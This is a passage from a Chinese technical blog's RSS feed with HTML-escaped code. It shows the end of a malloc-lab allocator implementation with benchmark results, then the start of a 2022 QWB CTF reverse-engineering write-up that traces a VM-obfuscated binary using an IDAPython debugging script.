        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bp;

    &lt;span style=&#34;color:#75715e&#34;&gt;/* coalesce with next block */&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;next_alloc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; prev_alloc) {
        size_t next_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(NEXT_BLKP(bp)));
        delete_node_from_free_list(bp, size);
        delete_node_from_free_list(NEXT_BLKP(bp), next_size);
        size &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; next_size;
        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
        PUT(HDRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
    }

    &lt;span style=&#34;color:#75715e&#34;&gt;/* coalesce with prev block */&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;prev_alloc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; next_alloc) {
        size_t prev_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(FTRP(PREV_BLKP(bp)));
        delete_node_from_free_list(bp, size);
        delete_node_from_free_list(PREV_BLKP(bp), prev_size);
        size &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; prev_size;
        PUT(HDRP(PREV_BLKP(bp)), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
        PUT(FTRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
        bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PREV_BLKP(bp);
    }

    &lt;span style=&#34;color:#75715e&#34;&gt;/* coalesce with prev and next block */&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;prev_alloc &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;next_alloc) {
        size_t prev_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(FTRP(PREV_BLKP(bp)));
        size_t next_size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(NEXT_BLKP(bp)));
        delete_node_from_free_list(bp, size);
        delete_node_from_free_list(PREV_BLKP(bp), prev_size);
        delete_node_from_free_list(NEXT_BLKP(bp), next_size);
        size &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; prev_size &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; next_size;
        PUT(HDRP(PREV_BLKP(bp)), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
        PUT(FTRP(NEXT_BLKP(bp)), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
        bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; PREV_BLKP(bp);
    };

    insert_node_to_free_list(bp, size);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bp;
}

&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * extend_heap - extend heap with a free block
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;extend_heap&lt;/span&gt;(size_t words) {
    &lt;span style=&#34;color:#66d9ef&#34;&gt;char&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;bp;
    size_t size;
    &lt;span style=&#34;color:#75715e&#34;&gt;/* Allocate and even number of words to maintain alignment */&lt;/span&gt;
    size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; (words &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;?&lt;/span&gt; (words &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE : words &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((&lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt;)(bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mem_sbrk(size)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;

    &lt;span style=&#34;color:#75715e&#34;&gt;/* Initialize free block header/footer and the epilogue header */&lt;/span&gt;
    PUT(HDRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
    PUT(FTRP(bp), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
    insert_node_to_free_list(bp, size);
    PUT(HDRP(NEXT_BLKP(bp)), PACK(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));

    &lt;span style=&#34;color:#75715e&#34;&gt;/* Coalesce if the previous block was free */&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; coalesce(bp);
}

&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * mm_init - initialize the malloc package.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mm_init&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;)
{
    &lt;span style=&#34;color:#75715e&#34;&gt;/* Create the initial empty heap */&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mem_sbrk(&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)   &lt;span style=&#34;color:#75715e&#34;&gt;/* sbrk() function returns the start address of the new area. */&lt;/span&gt;
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; i &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;; i &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; FREE_LIST_SIZE; &lt;span style=&#34;color:#f92672&#34;&gt;++&lt;/span&gt;i)
        free_lists[i] &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; NULL;
    PUT(heap_listp, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;);                                     &lt;span style=&#34;color:#75715e&#34;&gt;/* Alignment */&lt;/span&gt;
    PUT(heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE), PACK(DSIZE, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));          &lt;span style=&#34;color:#75715e&#34;&gt;/* Prologue block&amp;#39;s size is 8 and is always alloced */&lt;/span&gt;
    PUT(heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE), PACK(DSIZE, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
    PUT(heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE), PACK(&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));              &lt;span style=&#34;color:#75715e&#34;&gt;/* Epilogue header */&lt;/span&gt;
    heap_listp &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; (&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; WSIZE);
    
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (extend_heap(CHUNKSIZE&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;WSIZE) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;;
}

&lt;span style=&#34;color:#75715e&#34;&gt;/* 
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * mm_malloc - Allocate a block by incrementing the brk pointer.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; *     Always allocate a block whose size is a multiple of the alignment.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;mm_malloc&lt;/span&gt;(size_t size)
{
    &lt;span style=&#34;color:#75715e&#34;&gt;/* Ignore spurious requests */&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;)
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; DSIZE)
        size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; DSIZE;
    size_t newsize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; DSIZE &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; ((&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;size) &lt;span style=&#34;color:#f92672&#34;&gt;%&lt;/span&gt; DSIZE);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; bp;
    &lt;span style=&#34;color:#75715e&#34;&gt;// int newsize = ALIGN(size + SIZE_T_SIZE);
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; find_fit(newsize)) &lt;span style=&#34;color:#f92672&#34;&gt;!=&lt;/span&gt; NULL) {
        place(bp, newsize);
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bp;
    }
    size_t extendsize &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; MAX(newsize, CHUNKSIZE);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((bp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; extend_heap(extendsize&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;WSIZE)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
	   &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
    place(bp, newsize);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; bp;
}

&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * mm_free - Freeing a block does nothing.
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;mm_free&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ptr)
{
    size_t size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(ptr));

    PUT(HDRP(ptr), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
    PUT(FTRP(ptr), PACK(size, &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;));
    insert_node_to_free_list(ptr, size);
    coalesce(ptr);
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在不优化 realloc 的情况下可以拿到 84 左右的分数，和 next fit 接近&lt;/p&gt;
&lt;p&gt;简单优化一下 realloc，但由于 bug 实在太多，还是选择抄了一个只向后合并空闲块的 realloc（可以增加向前合并，但又得继续 debug，润了）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;这里踩到了一个坑，书上给的 extend_heap() 读入的是 words，而很多地方习惯直接给 byte 长度计算的 size 了，所以一直报“未进行复制”的错&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c&#34; data-lang=&#34;c&#34;&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/*
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; * mm_realloc - Implemented simply in terms of mm_malloc and mm_free
&lt;/span&gt;&lt;span style=&#34;color:#75715e&#34;&gt; */&lt;/span&gt;
&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;mm_realloc&lt;/span&gt;(&lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;ptr, size_t size){
    &lt;span style=&#34;color:#66d9ef&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt;nblock &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ptr;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; reamin;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;) &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (size &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;=&lt;/span&gt; DSIZE) size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;*&lt;/span&gt; DSIZE;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; size &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ALIGN(size &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;8&lt;/span&gt;);
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((reamin &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(ptr)) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; size) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; ptr;
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (&lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;GET_ALLOC(HDRP(NEXT_BLKP(ptr))) &lt;span style=&#34;color:#f92672&#34;&gt;||&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;GET_SIZE(HDRP(NEXT_BLKP(ptr)))){
        &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ((reamin &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; GET_SIZE(HDRP(ptr)) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; GET_SIZE(HDRP(NEXT_BLKP(ptr))) &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; size) &lt;span style=&#34;color:#f92672&#34;&gt;&amp;lt;&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;){
            &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (extend_heap(MAX(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;reamin, CHUNKSIZE)&lt;span style=&#34;color:#f92672&#34;&gt;/&lt;/span&gt;WSIZE) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; NULL)
                &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; NULL;
            reamin &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; MAX(&lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;reamin, CHUNKSIZE);
        }
        delete_node_from_free_list(NEXT_BLKP(ptr), GET_SIZE(HDRP(NEXT_BLKP(ptr))));
        PUT(HDRP(ptr), PACK(size &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; reamin, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
        PUT(FTRP(ptr), PACK(size &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; reamin, &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;));
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;{
        nblock &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; mm_malloc(size);
        memcpy(nblock, ptr, GET_SIZE(HDRP(ptr)));
        mm_free(ptr);
    }
    &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; nblock;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;测试结果：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;Results for mm malloc:
trace  valid  util     ops      secs  Kops
 0       yes   98%    5694  0.000143 39818
 1       yes   94%    5848  0.000171 34259
 2       yes   98%    6648  0.000196 33936
 3       yes   99%    5380  0.000147 36499
 4       yes   66%   14400  0.000256 56338
 5       yes   89%    4800  0.000180 26667
 6       yes   86%    4800  0.000192 25065
 7       yes   55%   12000  0.000243 49322
 8       yes   51%   24000  0.000424 56630
 9       yes   99%   14401  0.000163 88513
10       yes   67%   14401  0.000128112684
Total          82%  112372  0.002242 50128

Perf index = 49 (util) + 40 (thru) = 89/100
&lt;/code&gt;&lt;/pre&gt;</description>
        </item>
        <item>
        <title>qwb 2022 rev writeups</title>
        <link>/post/qwb2022-rev-writeups/</link>
        <pubDate>Tue, 02 Aug 2022 23:23:23 +0800</pubDate>
        
        <guid>/post/qwb2022-rev-writeups/</guid>
        <description>&lt;img src="/post/qwb2022-rev-writeups/cover.jpg" alt="Featured image of post qwb 2022 rev writeups" /&gt;&lt;h2 id=&#34;find_basic&#34;&gt;find_basic&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;没保存过程数据，以后找时间再补吧&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;用 IDA 查看，能够发现反编译结果很奇怪，看看反汇编就能够发现存在很多 pusha 和 call 之类的指令，不如对着汇编动调&lt;/p&gt;
&lt;p&gt;动调后因为不好找核心逻辑的位置，所以在输入处下个硬件断点，发现取出了输入的第一位内容，然后进行乘法和累加，类似下面这段代码：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;ADD        EAX,0x11
MOVZX      EAX,byte ptr [EAX]
MOVZX      EAX,AL
IMUL       EAX,EAX,-0x35cf6
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;主逻辑在0x750a9的位置，继续跟踪一下逻辑，整体相当于n个虚拟机，结构大概如下：&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;father_func@0x750a9:
    MOV CL, 0x??
    CALL son_func
&lt;/code&gt;&lt;/pre&gt;&lt;pre tabindex=&#34;0&#34;&gt;&lt;code class=&#34;language-assembly&#34; data-lang=&#34;assembly&#34;&gt;son_func:
    CMP CL, 0x??
    JMP ???
    CMP CL, 0x??
    JMP ???
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;每个子函数的开头和结尾都有一些类似话指令的逻辑，但动调发现好像不影响程序的逻辑，所以就忽略了&lt;/p&gt;
&lt;p&gt;跟踪了几个验证用的逻辑后，发现主要是乘法和累加，说明应该是一个矩阵运算，考虑到工作量很大，那就需要想办法进行自动提取了&lt;/p&gt;
&lt;p&gt;使用了 idapython 进行自动调试，并记录过程中运行的指令：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; binascii &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; hexlify

ea &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_reg_value(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eip&amp;#39;&lt;/span&gt;)
end &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; ea &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;0x1806&lt;/span&gt;
main_func &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_func_name(ea)

fp &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;all_asm.txt&amp;#39;&lt;/span&gt;,&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;)

&lt;span style=&#34;color:#66d9ef&#34;&gt;while&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;True&lt;/span&gt;:
    ea &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; get_reg_value(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;eip&amp;#39;&lt;/span&gt;)
    next_ea &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; next_head(ea)
    fp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(hexlify(get_bytes(ea, next_ea &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt; ea))&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode())
    fp&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;write(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\t&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; GetDisasm(ea)&lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; ea &lt;span style=&#34;color:#f92672&#34;&gt;&amp;gt;=&lt;/span&gt; end:
        &lt;span style=&#34;color:#66d9ef&#34;&gt;break&lt;/span&gt;
    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; main_func &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; get_func_name(ea):
        step_into()
    &lt;span style=&#34;color:#66d9ef&#34;&gt;else&lt;/span&gt;:
        step_over()
    wait_for_next_event(WFNE_SUSP, &lt;span style=&#34;color:#f92672&#34;&gt;-&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;)
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;blockquote&gt;
&lt;p&gt;需要先动调到要提取的函数的第一条指令&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;这段代码把所有执行的指令都提取了出来，这样也能够验证一下之前的分析结果是否正确&lt;/p&gt;
&lt;p&gt;观察提取结果发现，可以根据核心逻辑的上下指令进行定位，位于 &lt;code&gt;jnz&lt;/code&gt; 之后，&lt;code&gt;jmp&lt;/code&gt; 之前：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-python&#34; data-lang=&#34;python&#34;&gt;codes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;all_asm.txt&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;r&amp;#39;&lt;/span&gt;)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;read()&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;\n&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
c &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; open(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;asm.txt&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;w&amp;#39;&lt;/span&gt;)
